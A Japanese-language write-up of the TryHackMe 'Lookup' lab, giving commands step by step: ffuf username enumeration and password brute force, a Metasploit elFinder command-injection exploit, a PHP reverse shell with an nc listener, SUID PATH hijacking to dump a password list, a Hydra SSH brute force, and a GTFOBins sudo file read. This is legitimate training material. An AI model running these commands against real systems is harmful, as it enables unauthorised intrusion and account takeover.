---
tags: [hacking, box, writeup, tryhackme]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-01-08
skills:
  - Nmap
  - ffuf (ユーザ名列挙・パスワードブルートフォース)
  - Gobuster (ディレクトリ列挙)
  - elFinder RCE (CVE / Metasploit)
  - PHP リバースシェル
  - SUID悪用 (PATH Hijacking)
  - Hydra (SSHブルートフォース)
  - GTFOBins (look コマンド)
os: Linux (Ubuntu 20.04)
---

# Lookup

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux (Ubuntu 20.04)
**参考**: https://qiita.com/kk0128/items/8b5707094cd93d96be7c

---

## 攻略フロー概要

```
ポートスキャン
  → Webログインページ発見 (login.php)
  → ffuf でユーザ名列挙 → admin / jose 発見
  → ffuf でパスワードブルートフォース → password123
  → ログイン → files.lookup.thm へリダイレクト
  → elFinder 発見 → Metasploit で RCE
  → PHPリバースシェル → www-data 取得
  → SUID /usr/sbin/pwm + PATH Hijacking → パスワードリスト取得
  → Hydra で SSH ブルートフォース → think ユーザ取得 (user.txt)
  → sudo /usr/bin/look → GTFOBins で root.txt 取得
```

---

## 1. ポートスキャン

### 開いているポート

```bash
nmap -sT -P0 $IP
```

| ポート | サービス | バージョン |
|-------|---------|----------|
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |

### 詳細スキャン

```bash
# SSH
nmap -sV -Pn -n --disable-arp-ping --packet-trace -p 22 --reason $IP

# HTTP
nmap -sV -Pn -n --disable-arp-ping --packet-trace -p 80 --reason $IP
# → 302 Redirect to http://lookup.thm
```

### 脆弱性スキャン (vulnスクリプト)

```bash
# IPベースではCSRFなし
nmap -p 80 --script vuln $IP
# → /login.php 発見

# HOSTベースではCSRFフォームを検出
nmap -p 80 --script vuln $HOST
# → http-csrf: Form id=username, action=login.php
```

### /etc/hosts 登録

```bash
# IPではcurlが返ってこないのでhostsに登録が必要
echo "$IP $HOST" >> /etc/hosts
curl -H "Host: $HOST" $IP
# → login.php (username / password フォーム) が返ってくる
```

---

## 2. Web調査 / 認証突破

### ユーザ名列挙 (ffuf)

エラーメッセージの違いを利用してユーザ名を特定する。

| 入力 | レスポンス |
|-----|----------|
| 存在しないユーザ | `Wrong username or password.` (10語) |
| `admin` | `Wrong password.` (8語) |

```bash
# admin は存在することを手動確認
curl "http://$IP/login.php" -H "Host: $HOST" -X POST -d "username=admin&password=test"
# → "Wrong password."

# ffuf でユーザ名列挙 (-fw 10 で "Wrong username or password" を除外)
ffuf -u http://$IP/login.php \
     -H "Host: $HOST" \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=test" \
     -fw 10 \
     -w /usr/share/wordlists/rockyou.txt

# 結果: jose (Status: 302)
```

**発見したユーザ**: `admin`, `jose`

### パスワードブルートフォース (ffuf)

```bash
# jose のパスワードを特定 (-fw 8 で "Wrong password." を除外)
ffuf -u http://$IP/login.php \
     -H "Host: $HOST" \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=jose&password=FUZZ" \
     -fw 8 \
     -w /usr/share/wordlists/rockyou.txt

# 結果: password123 (Status: 302)
```

**認証情報**: `jose` / `password123`

> **ポイント**: `admin/password123` は実際にはログイン不可。レスポンスの単語数の差でユーザ存在を判別できる。

### ログイン後のリダイレクト

```bash
# -od でレスポンスを保存して確認
# Location: http://files.lookup.thm
echo "$IP files.$HOST" >> /etc/hosts
```

---

## 3. elFinder の発見と列挙

ログイン後 `files.lookup.thm` に遷移。タイトルに **elFinder** を確認。

```bash
gobuster dir \
  -u 'http://files.lookup.thm/elFinder/' \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 200
```

| パス | ステータス |
|-----|---------|
| `/css` | 301 |
| `/files` | 301 |
| `/php` | 301 |
| `/js` | 301 |
| `/.htaccess` | 403 |

### Exploit情報の調査

```bash
searchsploit elfinder
# → elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection
```

---

## 4. Initial Access (elFinder RCE)

### Metasploit で RCE

```bash
msfconsole
msf6> search elfinder
# → exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection (index 4)

msf6> use 4
msf6> set RHOSTS files.lookup.thm
msf6> run

# Meterpreter セッション取得
# Server username: www-data
```

### シェルの確認

```bash
meterpreter> getuid
# → www-data

meterpreter> cd /home/
meterpreter> ls
# → think/, ubuntu/, ssm-user/

# think/user.txt は権限なし (rw-r-----)
meterpreter> cat /home/think/user.txt
# → [-] core_channel_open: Operation failed: 1
```

### PHPリバースシェル (より安定したシェルへ)

```bash
# 1. revshells.com で PHP reverse shell を生成 (IP: 攻撃元, Port: 8888)

# 2. Meterpreter 経由でアップロード
meterpreter> cd /var/www/files.lookup.thm/public_html/elFinder/php
meterpreter> upload shell.php shell.php

# 3. 攻撃元で待ち受け
nc -lnvp 8888

# 4. ブラウザで elFinder から shell.php をクリック → 接続

# 5. PTY 取得
python3 -c 'import pty; pty.spawn("bash")'
```

---

## 5. 権限昇格 (www-data → think)

### SUID ファイルの探索

```bash
find /usr/ -perm -u=s -type f 2>/dev/null
# → /usr/sbin/pwm  ← 怪しい
```

### /usr/sbin/pwm の解析

```bash
/usr/sbin/pwm
# [!] Running 'id' command to extract the username and user ID (UID)
# [!] ID: www-data
# [-] File /home/www-data/.passwords not found
```

**動作**: `id` コマンドの出力からユーザ名を取得し、`/home/<ユーザ>/.passwords` を表示する。

### PATH Hijacking で think として実行

```bash
# 偽の id コマンドを作成
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id

# PATH に /tmp を先頭に追加
export PATH=/tmp:$PATH

# pwm を実行 → /home/think/.passwords の内容が出力される
/usr/sbin/pwm
```

**取得したパスワードリスト** (抜粋):
```
jose1006
thepassword
josemario.AKA(think)
jose(1993)
...（約50件）
```

### Hydra で SSH ブルートフォース

```bash
# パスワードリストをファイルに保存
vi password-list.txt

hydra -f -l think -P password-list.txt lookup.thm ssh
# → [22][ssh] host: lookup.thm  login: think  password: josemario.AKA(think)
```

### SSH 接続 & user.txt 取得

```bash
ssh think@lookup.thm
# パスワード: josemario.AKA(think)

think@ip:~$ cat user.txt
# → <user flag>
```

---

## 6. 権限昇格 (think → root)

### sudo 権限の確認

```bash
sudo -l
# → (ALL) /usr/bin/look
```

### GTFOBins: look コマンドで任意ファイル読み取り

参考: https://gtfobins.github.io/gtfobins/look/#sudo

```bash
LFILE=/root/root.txt
sudo /usr/bin/look '' "$LFILE"
# → <root flag>
```

---

## 習得スキル・学び

- **ffuf によるユーザ名列挙**: レスポンスの単語数差 (`-fw`) でユーザ存在を判別できる
- **ffuf のフィルタオプション**: `-fw`（単語数）、`-mr`（正規表現）を状況に応じて使い分ける
- **サブドメインの発見**: ログイン後のリダイレクト先から `files.lookup.thm` を発見 → `/etc/hosts` 登録が必要
- **elFinder RCE**: Metasploit `elfinder_php_connector_exiftran_cmd_injection` モジュール
- **PATH Hijacking**: SUID バイナリが `id` などの外部コマンドを絶対パスなしで呼び出す場合、偽コマンドを `/tmp` に置いて PATH を上書きできる
- **GTFOBins**: `sudo /usr/bin/look` で任意ファイルを読める

## ハマったポイント

- `admin/password123` は認証に失敗した。実際に使えるのは `jose/password123`
- IP直打ちではページが表示されない → `/etc/hosts` にホスト名登録が必要
- Meterpreter からは `user.txt` を直接 cat できない → PHPリバースシェルで安定したシェルが必要

## 参考リンク

- [Qiita Writeup](https://qiita.com/kk0128/items/8b5707094cd93d96be7c)
- [GTFOBins - look](https://gtfobins.github.io/gtfobins/look/#sudo)
- [revshells.com](https://www.revshells.com/)
